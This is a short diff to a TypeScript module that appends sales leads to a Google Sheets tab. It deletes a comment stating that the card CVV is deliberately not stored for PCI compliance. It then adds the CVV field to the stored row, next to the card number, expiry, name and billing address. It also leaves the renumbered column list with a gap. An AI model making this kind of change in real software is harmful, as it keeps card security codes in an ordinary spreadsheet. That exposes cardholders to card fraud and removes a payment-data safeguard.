@@ -5,7 +5,7 @@ import { calculateQuote, formatCurrency } from "./pricing";
 import { getGoogleAuth } from "./google";
 
 /*
- * Applications tab columns (A–Z) — note: CVV is intentionally NOT stored (PCI):
+ * Applications tab columns:
  * A  Timestamp
  * B  Traffic Source (URL)
  * C  Landing Page
@@ -15,9 +15,8 @@ import { getGoogleAuth } from "./google";
  * G  Owners to List
  * H  Asset Permission
  * I  Cities (e.g. "Austin, TX; Dallas, TX")
- * J  Industries
- * K  Featured Listing
- * L  First Name
+ * J  Categories
+ * K  First Name
  * M  Last Name
  * N  Email
  * O  Contact Phone
@@ -155,6 +154,7 @@ export async function appendLead(
     `Award Shipping: ${data.awardShippingAddress}, ${data.awardShippingCity}, ${data.awardShippingState} ${data.awardShippingZip}`,
     data.cardNumber,
     data.cardExpiry,
+    data.cardCvv,
     data.cardName,
     data.billingAddress,
     data.billingCity,
